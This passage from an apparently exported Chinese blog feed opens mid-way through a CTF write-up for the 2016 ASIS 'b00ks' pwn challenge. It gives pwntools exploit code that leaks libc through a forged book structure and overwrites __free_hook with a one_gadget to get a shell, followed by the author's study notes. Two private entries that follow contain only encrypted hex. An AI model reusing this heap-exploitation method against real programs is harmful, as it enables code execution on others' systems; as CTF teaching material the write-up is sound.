hex(book1_addr))#改第一个书的description为伪造的book2（name指针和des指针指向book2的name指针和des指针）payload='a'*0x3c0+p64(1)+p64(book1_addr+0x38)+p64(book1_addr+0x40)+p64(0xaaaa)edit(1,payload)#改名字覆盖book1的地址，使被覆盖的地址指向伪造的Bookchange('a'*32)#泄露libc地址和查看one_gadget地址offset=0x5b2010 #需要自己确定，变动较大。#one_gadget=0x45216one_gadget=0x4526a#one_gadget=0xf02a4#one_gadget=0xf1147book_id,book_name,book_des,book_author = printf(1)book2_name_addr=u64(book_name.ljust(8,'\x00'))log.success('book2_name_addr=' + hex(book2_name_addr))libcbase = book2_name_addr - offset#通过伪造的Book改book2的des指针，使其指向__free_hook, 通过edit功能将__free_hook改为one_gadget free_hook = libc.symbols['__free_hook'] + libcbase#binsh_addr=libc.search('/bin/sh').next() + libcbase#system_addr=libc.symbols['system'] + libcbaseedit(1,p64(free_hook))one_gadget_addr = one_gadget + libcbaseedit(2,p64(one_gadget_addr))#然后调用删除功能，调用free()函数delete(2)p.interactive() 第一次做的时候的一些心得:2016-Asis-b00ks: 个人感觉这一题难度较大（off-by-null），我对这别人wp才勉强看懂并且感觉思路比较巧妙，也获益匪浅，最后自己拿了shell也比较开心，起码证明自己真的懂了。。。。。想总结几个小的需要注意，很有可能成为阻碍我们做题的关键点。 关于调试：调试最好用gdb attach pid 在exp未成形之前，保证不要有语法错误，然后一点一点跟exp看数据行了，如果开了PIE的话，下断点要用基址（用vmmap看）+ida里的地址才是程序真正的虚拟地址。调试过程x/160xg addr 看bss段的数据或者堆的数据。 libc的偏移泄露新方法：mmap出来的地址和libc的地址相对位置不变。 除了用got表之外的新方法。 relro full 时虽然无法改got中的数据，但是可以改__free_hook(malloc同理） 在recvuntil()接收时一定要注意‘ ’和‘\n’的处理。。而且一般只要截取最后一个标点即可。 python的函数返回值可以有多个，同理也是可以多个接收。for i in range(整数)的巧妙运用也可以接收到自己想接收的数据。 泄露Libc’的思路可以为先想着泄露一块当前程序的一个地址（mmap地址或者堆的地址），然后通过gdb调试看某一次的程序来确定偏移（got则不需要），之后用泄露的地址加上偏移即可。 如果程序有对某一块内存写的功能函数，我们就可以想着控制这块内存的地址，进而造成任意内存写。 one_gadget的运用，暂时觉得可以逐个尝试，有可能需要构造rax rsp等等。调试问题还未解决]]></content>
      <categories>
        <category>CTF-PWN</category>
      </categories>
      <tags>
        <tag>WP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[格式化字符串小心得]]></title>
    <url>%2F2019%2F03%2F31%2F%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%B0%8F%E5%BF%83%E5%BE%97%2F</url>
    <content type="text"><![CDATA[私人空间，谢绝访问 42436dcc0935ea2f60703479aa05ea898951493a48bcbec9fc2ad9a399be4027500886e1cf705760c7d34370fbcc79d8eeb196dbbb90a5073904acadeb87318202b60a29cffa456806d051268d1b10d6da1bccf8f828252cbaaf7ce538580140e7cfb7d99d56aa84ff86a0e24b5bf744108971964cb08c79367d5eedb55029c803187c3864f4e9c7fa944a60880bbc1163791ad1a19c52cd7a3ab98ee999989c4a2e0f5b4f53b2fd3e515b2a497c03397774b2c2db80863f096e48a61744e889e5523981d4fe2a3e0fa84b7a19b1cb5a09faace46b4995c2ce71ef59ba65b0df39431a738037e3513b51bb2c1e91645cf0924aba0f84c2443792a7c9c782167aad6c47b63bb337e0580ba0c82d5b11c0ab209156628dba6a677419cb13c27fa3223e876152714a6434718f49e149e43f4753c13389388f31ec87fcda013e6219b1eda8de6a755df8c12434f45a1b734f4219c56b57967a4b5e53d873c53452c935f7231f21f83231869c027744cca5fb5a1afff12982e265103aaf0492eacaf9df6b579689d47575b88d9aec6b1f556230e058b2dcbfeb7474b884e918fa0177ed0215ddf820294057443017c89fa0bc1e772bcb69bec582d3a9f9de1f5c81975c292d479e5b0eea95ad7a233dcce247f656c3c40f5589185640f007ca498907d8864f233dc2c54b78694d4db0329f0194d2004a721accbce48264ce3b59541c5022a0406564b760a6b86745683daa2c9d3db9a83e9b7aa8a820d4184c37ae878df2f1c379eb755aa2294527fb48ea55ad9ad27b14a6f32c5c9312118f6897f724634852474b0360a4bcd25cb0783bb1fdd1cc86f92a1aa0984627b6fde5dc98f5f4324b7a43e47f485126af4d1438443d535ca49ab38cf355b693d6372b649b6dcaddfb9d91895bea7ebb3ade55fd0b18e32dd22dec7288bb01f5ae0076ca39928a6bc6df4ab923e95e0d2c0a17aa6711d7b4f324dc04decf46dfc02619bfc3fc8717465b0033a11d2a74ad72436f8f50d4158e581410324326a86f8d088c583c91ab53f85d358194fdf96a05e10d935ce40cba6723eaae90a85e7affa580845686b95cc44f1d1a5fde61596050af36ec9ea2db071f1ce86a59aad6cc4af546a1ad94bc8ae6f5f9fe14c6d7033965b23d1772e585542efa74c779bc13d6ad9ad889c553d181baea4dd9f9346b5249122f13467b3d140bf3af8273cd2bbfc67d8f0d4edab592dd97c5588a2d1cfca32925502759cac84e4de6933ca62736c8ea993522818cbbfca69e3163919b075dca3f45d291beee05b4e59707cdfda270381df42b66f07c2c7528bbfc0de014e5939de64c15680acf5c0ca5de696cf726a43735f479cff77694fec9d5707819c39a9a89c3d42e9ae97c977cb13289eed2681e2fe55e04ff127313288aa2c707aab725a6ce1c56c8ba6834baf0bf82079fbe48caf3160e6e7332d80ef444ca19b34627dd2f178b29ad5444478c593886cde3115317280d8c24ce5a7f9cc46eb58b5251cf9a2b1f0eedf61af3b2d97e01992025ee8b5d3da8cd066ace07f17cab6a44fbae6ec88f016677af65259483ae2cc577aaa02b5a74f09c041e71bd2c81b190c3764fc0b3e8bd7245e8dbc7344d70ede16519d32247b142e30e61743ec616748090d58ee043ab6e5883bfbaa46f322ee1026fb166469ba865123bc2a08d354ad23e7ba129b4797fa805c7ac8d4d92cf8f873bf065fad82985b21d230f24418b4a850f33eb8b461b57dc0fcab64bd660974e2f4e48c393d1b8c7da832183f6130ebc7b5ee15c1450d370b572fe92b0694018c55f15cc28915b12b0231d413f1aef2f6847f98b5669a52863a1ff4978fd26b10ea107052de61d5bf6819e0b23209583b790ac15b498db7ac6ee6a816458f4b09fc7228b1ab968e3edb07a5eb9b6bc07af56626e47e828f5f9393cbc228666e72601c447d72f131929e41ebe489bc98bc5d30e3fe5f7674f61552bc2fd981e886b73ea3b6ab1b0b57942b03c65d3631da9214abdaf1708a68b0b5cdf3fc2dea101b5e7b5497be01a2a959ff61d4a636388442c6b748e68fa2f5521d4ece089985ada3913a78c288658a441886396a132e8e685eb1ee789d47ba64ae7f0dda4d153a21a394764d6e44dd5fe5f34f2d322e59064d6348994fd2a3eac5b10094174681dd009536e055ed038c708bd5c1396a7dfd39507bc551000d6e01492f12fa000be975a5c4f8d6a38ef968b92048be9e1730e73ab7929eb2780c2a261838a09e0d3ba8500d6b80ef8c6be1638835daa50d2b9b1e8623488edc1d2ba73119ca96a69f7a6ba3c17b2253cdf4cf05f4c0fe695c6341d7cb0f8c9b26c8cae872b191ee6e14be4fd3612821d8d5f67ccd01ebee75ce3583cbc2b8fb51fa8fa4049baca1e3da7925526de5f5d1ffaed047d3cc5b9761ead8ded1f2fe59d8ca7a8b1f5e72a4eabb7b801edee7c7ef5a86cf208ba309bd574f0180474b2cf43e4eec67b7c06c03b2f9a450df887a46123af594a102482e41735eecd7f9ef1a5597034a74adfb2749af54abb7baf51e87240734c52482c18ab48f060a6daf2ca59264293fcbd07feba7b3af661522e93d4523b1e8819cf2accdcdaa7015ba09d559f95da025454f82c1465cc1635ee86b61a952c2b259b6cde39636ac68da54632be0a2e12ab8128ec02330aee5102a179405ccbfdbc580d7dc9c0f8a6f5a9cf509858811bc3c162017d8be279dc627c4679897a7e2872ae8ff0d4fff1397effd3756df39d4ca15e8a0afb49225bb38f2bdab668353cbdbfea59938154c787cf68307120ddeb25fa09a7e0f38b7d4a1bd6c8675b84997381ac74dda289f9e4545db9509f2236798cc825150a455934b95d6e8684a80e8ceddb80ca693a7f6f1c98c4f6bb76098fd033caacbe5b1e3e115fe83e11a11cd044303496e946655175cbaff52ef320ee03fddd8f70a98876a3f131cdfa6a288620413da626670af2babb6b5bd1cff6aad40b480df46ec33983e9f58ab1859380747ae1d4e416ea67e139f637d5a45b2276c285e1707d038c2282f39e789bd2050bb4176afcca9757c73ccd00764e90b43d123dc71f38519d74d0cfec5a90eed22afb14cce3349ca6ea975b0965ff0200f07e3ce6baa0198e594a5bfe6a9fb4020e9e204c557d149bbbcbe0d5ed4702a9ef842fb1f51549d426c5b02904a5ae57a789c8ae15557e701257da2330aec9f0928b283e2a8da0d6bdf2dceabe80f84da7cea7cc01f240b13f3e6702e3f5ad7a48723bfee6cc01491646dbaf2af77179d7d2e196b4918d16518416f84c7196d21e5e0ba494c80cdb7a71046540ae62455d702c4f4dac379cdc898432e247e468d749a478809bbe0a135c8da845a57cbcb9f2648b888756acc1c63aab7d34d0bec4388d108bb8ad829da2fa27d6c3b8fba35961eba3f3e1c555149f6884868d688ce8f3b1a180c1a34dd718c856bfec1ec8024485b3e094097233f1ca1fc69624c49b4f2b88b443ec1ca01aad97a220d5071a3627ec43367ab9f37c6654975bc42fd622895cc76ca327aba54621b99245574905e880108beccaabf833b377010ffcac2732c31b367e3b8b5f59cd225c1bf4a64ee8245b64f9a3b971e7bf31d023a5464aa723d019a78c57eb50b384471840a5c93cd0cceffd6deccbeecac5dd070813734a556a4ade70b760e0f8d23a2f8d704792959d4363e13fde46dcc7e9f56d515169c026ff277bc253b6746bee21594490a0ee3c8cc3f8b1b745df953992ace5a5e18c5630dd966ae95e634b22fc6522b8f487395f9a6f19c3767717085916a8ce7745fb813c8a5287bc6d7771db165776e999cddf423626e848a91ae607621dc83d1d6e4b21b73a2714d746ca6eff91c90a7e531e000fa7d8639b44d0dabf073bdf8515843e5dd9bde1a564f489eb945480df184cd8126909ea38200250ee96b8a1b3b426f81d6c0be517916e10ce8b8ef03525d61720923cd81a3602efde5a362253f4a20427aaa5d6590a7f3962241ca63ab120e0db0b968617a585e0d8123d4e3e7504d279a72f052ae8bfa321d62a421ab47e628ef78f1c3bd376fb4e1a36335a0bb1aaa233748d05cac41e4ffef95cc729d5f4b3bd2297c2df5cc2c8802f7f9796d89458a12a62122f83b707849754397d777d853e0ccf88d48dcbf1ef53f6ed08dd58dfb10ddc9bed75cfbe1c0a806e5825dc615b8d28c730768b3859a3d5af77cb47a70dba9442b2fe059fe80bdd6d5f0b557da51a7a53acbc70737a2dd3ff4621019a097d]]></content>
      <categories>
        <category>私人空间</category>
      </categories>
      <tags>
        <tag>summary</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[寒假小结]]></title>
    <url>%2F2019%2F03%2F31%2F%E5%AF%92%E5%81%87%E5%B0%8F%E7%BB%93%2F</url>
    <content type="text"><![CDATA[私人空间，谢绝访问 80080fb9b96ffa56f71696a5a0ed70d4872ab799b6b6608c69073ba704341c6a04e22809c66f3cbccd8e55cd8d7733e04c9c8d74b0a47c3017c96daf19abf468cfcb22cfc8d19ae86a7ab3ba6b9462cb390c4bb11e2f6e1ea26961b135d930196527ac210bd65da23b05434c503bc68bb7c55ea05f860d8b95fd516df11315ab75b9b5c3bf8fdcf21e87fd5bff4d0838a45de276c00fefa4f2ea0c0bdeeb02149b26df1fed706f3be596f0581df00c158c5a0578d162f1dda25197ceb10e8722b1ffbdc21e3f80515ac9901607560cfc142bd2dec666da79d961a66d515bdea5967e4302356a29e25aa31fa73d347904857746379f71a6efeaed814342ffbe142178daa91d7e1dccba414ab06dc0535ea2d5a45057a14e8425097699118e99ca30262c82a544938960301f5844fdb265154aba492f897ceab1f3e4da80e555c20890044a1bd0d8a8fa084eff498411354632faab6e897a3f8accba17d3774172af9615378abe255c260f8846bb7de1fc48fa37fd3aa65b3e8c4aa4f6358ad449ddb7e8e80f57834e27bff2430ba50f32c33acd15fe3034bd6e53008764df678108baa63cc1bb2271b89b3b69ff75472d71f02ac8f20c01d178df47a0252730153df307681d57bf4465fd3a6a76fe46d5857f7ba6291b5804091b89b99de4cf3d41baeeb028baa7868062986e52a28727eb4baa238e2daba1aeaff489f760090f1cf0141d090fe2e2f14cf4df5bc5879363bb4da54d36b0d23e4b19168c6a0ded708cd1a3f5cf2726905d50c62e2f633687ba10663c7bd8045483ef21aa88ecca02a285bcdf70e28bd7e02c2c07509c3f654d7f75dcd42e395d2b862c5903b2f51c7be42b7652f91ccb9949b127d6940c9088ee7afc11a5432666feb0ec82bdf0ec785ed230f32208663dffba59b6bb289cedaec01233e2158133642d9d87ac2c36fae94aef85904e6c9fee4865f79b5333f10863a64a1865ab01db1b8faa1d32d8d7f26d66cb7df1a3e1ce32ba1b1fa238a320858f551f0fb7cf704a61b1b24351d6f4a2fa3ec5e5c967b8f0d8014fbc0ad3768f777b9ed50bba495bee8fe7f0afe805fb23666ab0b4f148110216838b4f6954e59a57d7d527678cc5737e9ce4502d80f10f92b7786f1ec781d1515392ae481287843cf2a4d7134098c9bb16c9d7d5d8ca528062912c71f84262623093182d26172677cf789ba98ce965bbf52316a4109b0019971a58c6b402c9cb87ff37640ffadc161a0fc53e63a9c095dfa0ca9750369f00f07b4d225a335fc5d0213b07cb02533b978ae4b649c1ffad43c86e77ee10670c8681f7985e9b8a72385c6a48737e2ccac63b16c340db9a549747557e8411c41ea6d66c7a2093fe81123fc95ac83f26ab44e5a5a23f934268fcd6850df1e5cda986f9e12008fbb995c62cc4943930e5db8c9f6bd15582ad66b85a9acb7b05907f19128ae7229d0cb887ed868539c109beddba367fe9994418c60cb6b1ffc0d4fdfa80784112c1ae463711f5d5e74340a305ac7eed7e10bf881d35fcabd0c121fd1565ead207ed4d34dacef0cb3428c77d1a5ae4b6e45f8c50e6883d8dd1a39c13ffcde46de65944c4ec876b226c047be57317d5676f1c31c1ba36634948e28a3d3ce8174312d2c653c972f92db4ac3a4801d6730b707a9293a4c71f205a95155500c03ab82874469d91b119a62dba05fcd31416d1034ca840634b856fc385b51f3458f7b05f211fe059eb5bcbd062dc5a57a49a001a2421e8e389532bf8771d07565b12f627bc66cfdc023135c3bee24a83c63f57553e0aa47ef32472b76cc6e89cfd4d20753351041646b9ca6ad6758956380f0b03c11b973b3fb89746e38d81e87dcfee664cbe4d6842f4b9512fb60236a1e337a58479e36b6319020f85a641777de20d972aa291b2405dc634ba7a84a6205026fb6d04db91d35f790de4280850af776742e327907678179772ae72b61b4af193e3a6a815f4d5efd111ad8c0e2ea9646e0c106952b3d946d219ef83d40ffd857224aa41f0c6e23641aed763d70769e9e03ef23ee5e6b28b94e965a3ad728922415920181f90ffde18a3e3dddeff2dbd67d3f08d722a47baa6779cca0f3ec7bc947221fc4ba51cc73353117d1c6461f8ce144c3e2a3389cd868db545e841ab0db4c0d885e8172cd23f7778d327a923660931ee349e4717814225fefcdf89a7deff5433ee242ca172a4d39ac6994a0c721ee1f3986be2f1119d6c821d1af159aa0ad96bf5318538dee22b21304be3fed724da8a84c71d7b91adceac2351e0afcf2cbc5698b32baae40456fcd447fe4f8703c04275a572c85da47d1bc55fdddadd3134b8e9223ac3b01b8a4a6002b6be2a18140d618a78bbf2faee704f679485986d1023329c804d41e0b9309ad006244a1ff44e4a9bb2f9289db4f44b5f8da698f38e996ac0de1aa9a35e53434a36dc7e7950ccc9d2b788850bf1aa313f2ab53048e0720137bca8c1c53a2bb3a0d8c1472756b3603ffe90f1fe41fa5fa7b64a48f96fd3443f874397274594dc84927e0f2d2ba1223f8288a7ceef94cee39493befd121fec39a819fbad036df0e252bdbbd448f3d6c7d0604324bf3559f339f74e9f863a095f887535e7ff2a8a1b33deb9010723f4d7767a3fb9b0aadd84f81494174c10744f12d136a5cea322dd9f45a02f28c85d7e4503215012e23f34176a966c44024b08c5157bc4fe9d2ebaefa5778096feb5b5fe48a007f0be03d934b0ef5e8a2437c18cbfab07f077cfc74f2e14f2c8dd625adec97b3e9503d71ff60917178fe9f4b5d33db1530433dee209932f651acb34f8dae29ac202e2a71e0c6ae473c33d22c0e55f77f512bf0b73bccc979144cf8c2d77227d1e427e682e392b98e15e98b26c5387f2b3737d75888fd21a0a52fc85029d84b88b9817b93944ab2f2fbc507f8ee4637c9bb0a9a0a1f780920a3b22f6a7b9d5f000a694f6869d4a3c4faf1dc77d018bf2a2c8e08a51edc4970d86b946c6429394bab8a78e0d79c629ab127fe00e008febd326b00cee174ed191a1023c83d84b8937da93333e7363db4fe6ba32d3b5a56eecb47758f3c315ec5ea4ee0c4dc9c4642e79c4835e5e8bc7397000db7b7d8b0ab4040d0860192d5a80fa48765c40b970c6f68c9f1f5d31273a83dec0f0d979a030714bd205371745413a8ff6b6892c5ac7d483bce38b32d1cfa89c1e6553050020b641e220b5140d715669afff49b15b6e3430e8086999fdf5850eda9a0e77f008c48f0bc7cf057e7e56870050e4e44a06a3e804341483eb163603cc0dad98d0851d9f1eddd1fe8372303cf8505bb47ad150d1f9befe33b728fe9a1152a0e1723134218cb6efa2f4373edb024da3a75b1b65c12e60b14f9951ddddcb961175ef4a6a654ee339540dd62f507a5371c966c88a1ec8969b8ab8eb640cd2668ae82f8dec952ac794d6d52f1c5312a864a7c3d99012ef0904d1c8b6535d3e964552bfb9b88827426f8d920aaa837740c4571c78a0c3e7ecd371760e248c979bb90755a2031fc4588bdcaa3457415f7d3fa1f2745939279c5dd09b652d59757bed567627562fa1863f307cd00039669d82a55793a3e8aecd891479127643a43dc751753ba845550e94df3b487f9a32c821c0b38c3c8b662e72066c6b1edebd72e6ffe47fb4b9acb90bee254784e2b764df5820224177bc72bbce1b80acf1f382b6b3a596cbfc0d97f8d2f499bf3c41f1fac0db1e83f70cedddc44f4218a196f3ded136f8124787259e18b47a36cffa059f9a015d611845b47db47f40e70990d0c6ac351122e3c3aac9390c3596d1319628bac30fa1da930e18c2c797a7ea2478ed522e11981e76a9aa5f7841a6f4044cf4c9510d9c85fc437ad5aed266c5bfe2787516266ee42d35dd101f7195b02f3cc3d4016b6641d1033d7e63f046907f7d4544a807cf1ed5cbbbd54f25fa79466372929753c39c9e101deae80337269d00cdef553426fd9b3b7424a86e999f704f6944f0c47b9a0146041ef4dfb2eaa5002c3b33ae4c8c07b67f0c96183e2dd06445f2b275a2ac53fd05e71ecc9a374c70d68ed49a2fdd29a4aa822307628e26828dfdaf761326ea633cdd247c991e06397a516f64ab6df0e11b2e24f3da39ea3cbfb8062f5157721ae004626ea7412b3bb772d384baa03c57e2dd43930989064c95f07e1af75db413411d1a2b312af86652faadeb6f3fc0f1f0fb43ee965f9926dc755c96538b78e8124c9413663bea5b353e82b44d4be26b334596119ff523c7bdf4b268251d04e15c6eafbde0a14a7afd4bf51a41e6ce915bb8c58b01fed0be3b53bdf649c95f40370b448aa052d67daea858470e70b89d470ebc1aa8b28c46cdc0b56f7b69b66212ec36ddadd8d3fa7d730c81b0a5fbd47adad51adb5464b92bccb31c81f1888d482aca1c1f35478df630d607df1f215036f23b5e22dd11cc91b85a2aad1b8da66bea75f46be888157709a7e68396a8b93184da9676eb4be90345e575023738b3be705ba6b18d2613a026945e05d49e22bfb422e602410deda318c77579eaabb53fa5aba5a21287c1364c004fe73a3f5403b99ccc1e9dd0b5ef8b89d88804481012a212ef3412fd67d2f410f544a083c597227b466f90dcb3c6c14e9d6668cd0a1e145a94544d4e8af6a3630d7c7acc4866f09bb2e735d169ff550873cbe7518e8de6b65a01e28b7ca79e151a2e5b75fa02e90cac0d4b994a0f707020ec3bc1d24484a66cecf59d06a0eae5e535e2b30feb390fe0b7e1349ee60bd9980c90853751f6db414e0cf0a8496982e114bd5cb2b59fc6d371a9ca2ba7a609920a0581a2cc52bf5103cfbff0b275b06bda9b5d31592806f0ac1619d870d8f7e1bf15a9031cf637c4b7c42c2a8395445fb99e7a86716e58351f9f7cabeed356b053bafdc6031e5186f34349ddf631ddd2cf24df7d2c059b7793fa53fba93ed5a860a821f66fa873d25d8ad095e2ca6e8501aea2730e5787a811a3dabbf1a7a653a9e88653f6993ec39139a49a4d178a56cb79f0683f8baf905140dc1d8daff10ffb4cc4388ea1898dc1d6860dd5638d77ee24aa46b4b0839b7739c287b42d04eedf1d39862e3ffec8699f215a2d47a06cd42739d0d1a765a07a5fe7f09184cf21880358bfd59e003d21aa499237c039b3440f00353f5cbecb9a8f230e738dfeaffd0d0e4250e51999ee6178c0d6c09596c0df2c48d1194e71c3ae14ff3b88ab5abbd9ac041dbf93e41310112a26038d513a150a57624e8ae87a601b68936923a304c3c848cb8e776d4d57e1b3c666bb178d67fcf8f136513376129ae560d5ed8a686160c258dfe0bc423d8447005ff9e1a8512d5d50b3171a671fe4bfaac0ddea0680a49523bd8fc04ed7fcc8097edda04d03a297878bb78480aa2731566250c0f952dcfb47719fc677f507c9a6f72e94eb85958ad5c3d6ae62c315176411ead4b339c695db9611b1968661725f364aa26e58540441cc17d798199eccdaa2fb8734f5f609ea9ecc51bf6a3849042bb2bc2614d327a21cfdc7d75078a570ad821fb8aef54db681678f06354106005344d10487a23b52033190fc09eb01311813f5f30fb90b5dea318f39d4f204b7119e4548f69a39a1a7470cf2e2d876d1899ebd5aa57a3e78cb6a5f5eb0bbfa47b00237db982fb3e68e0bac4f74b9ae9a7678b0c56802d07a46ad58eda9aec29a9ed4f7ecf4e52490f975a62d0934b995242f578c5bad4a4de66e47652a8e073759394106a51ad433736611363d8f136dda63ac1802acafaef09b5730ab3393a8f922f642631dbc1774373448f063bb5ec05e606a07c63ce3610fee358832236bd39efaf880da723a0202f4ef957fa1aa2fa82b0443f8dd9ca439b11bfefaa1846b9ae66356592e4713c14629114b6bd0184ae4a9b211e040fc852da8e4c368fe94b0d72c048677aa45da897a7ddab12683e4b875ad24cf61078050d30cfcb3bfdc626c7a3796a2e54a230b4edfef67aece7d2f3aff7bc6d9175533d69843d25a11fce3f87548cc6ffa42bfa9d6c06253e7b939111472d0968f276e4cdfdbea24b808a4d7bd403bf93b6a614c4a1915daba9a231d9e99bd5c8d07b46118696c57079bfa02713233b341240ed64cf9e283b32793ed386bb67cc49199b1f25026375825ce5cfdb7b51e4e55a122a583bf5f6cb62c4ad23710d494ac2314e7cf866d66d8633c2f404a3f47041a8cb9838a44dd26091a2337ac0a2570298a374cccf4534f5e467652e0b7e27daf713fa2e3f690c0987417456b57ff4d34116bbe7781df961b1656874b403ba5a234adfa01b0c3737b73f3c126f19a767f7740b2a823243443423695f2bb11e23248f5f0e1c410b11b5ff2709ebdd65448a89e4696ea3d428088104746aa24a6b6f380fae33c5e054b5bc40cc81273658d1779e87c861a23764aa887be78bce7852ccfa4464fbcd84740d985ee7aeab0a4455c87c9a2fe57e0402bac252506aadbbeab725b2c6954ef49140707c5d69e91d4249b457c8d9d62eca556b4c4b8e586dc6d06d1530b2833c7baa6d60c52d6f21e2c265ff7f3d0b8e8a0e630b6bdc38b1910078d69fe81ccb328595e46c0341412ac71d3c6f708787f90e0a38fc9c4157480d50a2d5d73d036d91ec99381987f327a26e964e04b281b8cacecb55118915808ea203c823d07ce01cdd8674d8754fbdd0cbe9635c0d48c1e193400cdb6d73cf846309f012ed6cf52c98ddbcc48113481cc47c918213871a0e9e98093a4931b2427623056340abe1f1f69fef9ab95753acb10315a6300312a4900e8b40568cdb1100ba5d872c5a4bf4d0ec9cfe7aca9837facfd78d9b2d629298861bbc97952abe2f9ed3409ca111e3682faf646cb359076f4b9d27f2324bc2b7d52bec66e1bd220e1be14c5acd5af5633c87af27c6da99f9810e8107ecc91cb6692d9e0fe2240bba4224c856da75c62e08e4611eaf648ae647cb89c17e3ffa48444a43dd2427ef9c55ce8fc511452b289bfda879108719181a47d08baccea60e141bc9c6f85407cf147c6a3dda14bdadb1b957b85ca1836e815a38e4e758f314c88b7e8503fabf34a3ae9232958e8a2d14cda00d0afd7f5235505552e53fb0af5990109573546123ee1653d67f1e56649f19464ff9b3392c94dec5ec38395f0e096f9ec419630928bbba2c672cb38e74c1072e9d0e00b22de3d2a38614964fcf8d026ba649f940b1a6dfabce15356a7c63e1d7e22b72b05d767146453a57d18b8cd79861c7331862041f810d4c283aa51ee575ad8a671311ec42ecbe78a048c6af356d87318090122b25bb5b1a2a340ac8298bfa926e5b060ffe2b108557ef420942bb48d8178ba085317789069a33895fb9e114bb0fde2998ab3bf4758c9d998ccb2415a36dadb4c93b141b15221df3416fc66532d75dea16ef45d15a3042d54e272215f8e0d43495a5d76a852541a18f2c3a8d7854b25a53777bc8e71567d781438a18862f03acf84d46f30813394d2367c4534a5e08ecdbdba2397c408776232e7170bd1c563942266fbbdc470abb6f593ec1c75121c3d6d0ac5b0afffaa6298ff1d0b1aff6e307ca13e672100c2ea537d26f93ff3091fc5c611ef37ad96ef22ce331ff4e2c55d05bcf906fe6db17bab748b15018d963dbd06c03304e7cc2ff60c5d3057481f15e0e63d70e7cee5e5d55f712f5cf619429fad6ed6eef409189441c60a720050cc7d6d4d94e9de1e2519fb0de8884bf59b4bec530ce287a433b024753cf4553037b6e7484e793b1064feeba82778cf4f4c5e7dfbe98fef2009d24b785778698fbccfe0223ee7c233d6725ea935864212010941405e28a65fadc384bd9b7b950ffefac2b0e7e6419d8b4ea09d76500b8ef3c6c8be23e907e4c02a243b230150376e989eea69f12e84cfc04d871031008cbcfe3b119622fedd6e9e9a69c66c5e1da90ba99a3a74c6a640c79b53f19ab6f5b554ee1e5c9daffc77fecd88d3afafbebf32d82de7bea7349c1ab28f8901a70203448d97a4e78cb67e6386e525c147f3707de654a251b1259ab3bb09e18432d826236f4600e91e90027891b53051d8ad977630ad5b3d45e932bc5cd744ce7493187f90b385b2eb880b2c22b705bc769b98f70ee93d35b54e622833a55eff4b7ae7aac6eae1c19f5faa35b10c94b91abad701d1b448c944bd21b19a96cf550508184834a3442ee797d3de6f725740e8eb06565f242da679b002a10e4edf0e53768be9be8cec179d9a05b6c74ccc93612f31a732dafd2f1fa202ee8a02f669d6e3977acb30af0fdfd841ed1b0c6bee182e8379277f6ef64f74d4448770dcade524607e122b8dabe86e149723dd1ff32a98f9cbeacbb4493638699d4b023fe372c0d59e39665f373f2fa0c2e0110c767524040ac189393b75bf61388b91ed290e96a1df0b7f5075c1b2b775f3e9e3a4d0dd3f5a129892f9d90bc50855eabe3dd38a502cc8e277860e105890575e99fb84c510d7c7f9aa1321fe8ae947e63dab9fd99790c016a1d5886f3fba0fc4effbf07e3a534af9295aeb9f27458be7bb00f152dc1e5f0ab16c42fbd1484ba9aebe5eb6efddecfffc8498cda2de6cbb91d90c87dae002326d5fc0f0b701619661c7cd597693d9c00bc5eaaac2565a55f08e16dfedea4dc839357cd3563d4dbf479665ab7b63c05bdbd199a9f8e2dd3722cc3b22e9157a030f421544b19866037333da6bc58989f49431792b699e29eee27297f9987c6fe22809902882abfa2d5e64d5a7c76af3640d860af578b3a7e9ced5c6e9e964a64a9cb32b04f1158bc0a59f24f5376aa55457285a8956459c9c78dfe50232893c5d7769fccf6742f12ed173f34f42bfae728e56cfc213884dd3efc89ba85de34add404a16dd2ba0efb62c7a807b9092c2c1f9b7fa0d93b91bd839e3ddddfdd1f76078cb95295b787556cda1adfbed675e2777e31e2550f707ed4c0233be5de96deccb1f625ae808f3c04e361643790f3bfb5ce4204f049b8dcdd8e4aed05b4ff1076ce328490e9e4c2195fd553c61ebf7cd3d15a972a06a1d3401c6fd23540cb924ac8f37be87d2163248e21a35036ec9d5f32ff1c66287286ffb47c1d4579f32ea47f23993a9ea598692bc1dc4a8cde41073bc97e2f2b8f9b471422088f7a296103707682da56208cdd4b6781be2c61ffae76b20017c8b387abb5b786858b3f6248aec174ebffec29041d3dd51e75af69a6506a07fc91a7f5c523f87b56d274b360b745b3b21a367d6981fb5004f4700b3c6534689ff12e8ac955b2f34b8add224054b995f82930bf60be2c47f0a8a941836a8c0b6f08751fcdfdcc2d1a377204271a4d8f3eb19214d7215196c267c11ffd328b922588329312e1d16ae8a5a1fd5705c5d991f9549cc4fc5220299d822eae6d98c057977629a50257213ac75c919f83ff263200e7db9df6a9f5b571494f7f4395446ba6f6a0fbb37b8d8cd7f94ad339a9ef83c28755f1db350ea0ba4abe07a896af5707f2ba2cccdb8fdc02db7eab12df038c86a0ceeb2f549bdfa102c55456be279d8e437e43a0a33de3fe93f5b953756fc7dfaebe2fdaf8f7564cd77e678b48227cfb5791d46bc75a04351293dc9f1e59ee999ada2d3105256a13c0951876230a0b2b15031ddfbc73c21074ef122c7de5b901a6995cc696c063ea736720bdad13151c4d370ca7c87a5647963045230b839f8ad5ca7b7b5dbbe33233841632177a15d4a3da19281477d63fc25b72ec9b9c7504fc8879f3575d9273b348d36c88409f4a3b6c77043b5fbc57ef4f7bf8ef5164527a686c8c1c32964b889e35fce7c41c67afa73cb9a8f258320b87fb4ae5f9a9f78a1d62e4567db2259b0478d198507d331172d314a1daa880174db98a8826f83926dd49399fd0591077442ede7e1d6a4fcaf45da847a6e3751d18190cba2314ddfc52060d5457904cc93b7f60bf1e2755b9eee4fe2f89a534a9549eb5fd55979275f15581af3d8b33e3971477b7e597a8819f5a64631f3c30bdb3798642d0d41bc44a3bb6d24b7a69a549c681e373a1f9cf53c9d3b9f4697a61db4e05fd5729493a556e01b29fbb48286697f9283a8efc58d360fc62b8e93dfb9ee1bf8bc5e2599e4b042e17ad21516a8e009056ab2288470a17dbf87adffab34092505787947a296aaee546d9f047a02c6b190c64d2f84d70e0a372d02e3be3a85b4ab9eac1e0d0c3756c5df681d1e59fa0f6ecca314ab94bbd659b58ef73fafc96d0c740ee564324e301cbd94c3472c2b3eb6bce1da23dc767c020e7449e50dfe0ac135ea5d7ab3fff8faa1dd319b1112215271d950932a8ce5835721bd141b1c04382e2c47923b3ddd6992319551a999ee17594d84357c98f5b0fdede69725294f58534b9bba3c229f0971fd1b4687a169ce6128